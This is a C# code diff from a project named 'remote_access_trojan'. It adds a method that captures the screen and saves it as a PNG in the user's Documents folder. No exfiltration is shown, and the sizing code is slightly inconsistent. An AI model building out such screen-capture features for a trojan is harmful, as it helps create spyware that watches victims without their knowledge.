@@ -19,13 +19,35 @@ namespace remote_access_trojan
         {
             // set vars
         }
-        
+
         public void takeScreenshot()
         {
-            Bitmap image; 
+            // Create Bitmap image to store screenshot in
+            Bitmap image;
+            image = new Bitmap(1000, 900);
+            Rectangle bounds = Screen.GetBounds(Point.Empty);
+            Size s = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
 
-            // take a screenshot here
-            // for now, save it
+            Graphics memoryGraphics = Graphics.FromImage(image);
+            // Copy screen
+            memoryGraphics.CopyFromScreen(0, 0, 0, 0, bounds.Size);
+
+            // Save screenshot into file on Computer 
+            string str = "";
+            try
+            {
+                str = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
+                      @"\Screenshot.png");
+            }
+            catch (Exception er)
+            {
+                Console.WriteLine("Sorry, there was an error: " + er.Message);
+                Console.WriteLine();
+            }
+
+            // Save the image
+            image.Save(str);
+
         }
     }
 }
